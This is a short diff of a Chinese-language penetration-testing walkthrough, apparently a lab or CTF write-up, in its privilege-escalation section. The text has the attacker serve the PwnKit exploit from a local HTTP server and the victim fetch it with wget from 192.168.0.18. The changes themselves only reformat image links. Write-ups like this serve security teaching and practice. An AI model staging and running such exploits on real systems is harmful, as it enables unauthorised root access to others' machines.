@@ -184,8 +184,9 @@ Privilege Escalation
     上傳PwnKit到受害端並執行，本機架設httpserver
     sudo python3 -m http.server 80
 <img  alt="image" src="https://github.com/user-attachments/assets/770f3a07-48ef-4f0a-81ba-287f74a87189">
+
     受害端主機wget 192.168.0.18/PwnKit
-    <img  alt="image" src="https://github.com/user-attachments/assets/dd0f93d0-2220-4de2-a574-2d31e215d86a">
-    <img  alt="image" src="https://github.com/user-attachments/assets/cdfe2aa2-c495-4b2a-9cea-3503c4ae694b">
+<img  alt="image" src="https://github.com/user-attachments/assets/dd0f93d0-2220-4de2-a574-2d31e215d86a">
+<img  alt="image" src="https://github.com/user-attachments/assets/cdfe2aa2-c495-4b2a-9cea-3503c4ae694b">
 
     
